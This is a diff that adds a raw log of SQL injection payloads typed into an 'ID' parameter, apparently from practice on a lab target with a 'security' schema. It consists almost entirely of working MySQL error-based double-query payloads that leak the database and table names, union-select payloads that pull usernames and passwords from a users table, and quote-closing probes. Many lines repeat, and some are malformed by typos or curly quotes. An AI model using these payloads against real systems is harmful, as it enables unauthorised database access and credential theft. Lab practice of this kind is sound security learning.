@@ -1,0 +1,74 @@
+ID:0) union SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND()*2)) AS a from information_schema.tables group by a
+ID:0) union SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND()*2)) AS a from information_schema.tables group by a
+ID:1) union SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND()*2)) AS a from information_schema.tables group by a
+ID:1' union SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND()*2)) AS a from information_schema.tables group by a
+ID:1" union SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND()*2)) AS a from information_schema.tables group by a
+ID:1") union SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND()*2)) AS a from information_schema.tables group by a
+ID:1") union SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND()*2)) AS a from information_schema.tables group by a#
+ID:1" union SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND()*2)) AS a from information_schema.tables group by a#
+ID:1 union SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND()*2)) AS a from information_schema.tables group by a#
+ID:1' union SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND()*2)) AS a from information_schema.tables group by a#
+ID:1' union select 1,2,concat_ws(char(32,58,32),id,username,password) from  users limit 1,1 union select   1,2,'3
+ID:1' union select 1,2,concat_ws(char(32,58,32),id,username,password) from  users limit 1,1 union select   1,2,3#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a#
+ID:0'
+ID:0'523
+ID:0'#
+ID:0"#
+ID:0")#
+ID:0")#
+ID:0')#
+ID:0' union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema group by a#
+ID:0' union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:0' union select count(*),concat((select database()),floor(rand()*2)) as a from a group by a#
+ID:0' union select 8 from a#
+ID:0' union select a from a#
+ID:0' union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1'
+ID:1
+ID:1‘ union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1’  union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1’  union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:-1' union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:-1' union select count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:-1' union select count(*),count(*)concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:-1' union select count(*),count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:-1' union select count(*),count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:1' union select count(*),count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:0' union select count(*),count(*),concat((select database()),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:0' union select count(*),count(*),concat((select table_name from information_schema.tables where table_schema="security"),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:0' union select count(*),count(*),concat_ws(":",(select table_name from information_schema.tables where table_schema="security" ),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:0' union select count(*),count(*),concat_ws(":",(select table_name from information_schema.tables where table_schema="security" ),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:0' union select count(*),count(*),concat_ws(":",(select table_name from information_schema.tables where table_schema="security" limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#
+ID:0' union select count(*),count(*),concat((select table_name from information_schema.tables where table_schema="security" limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#
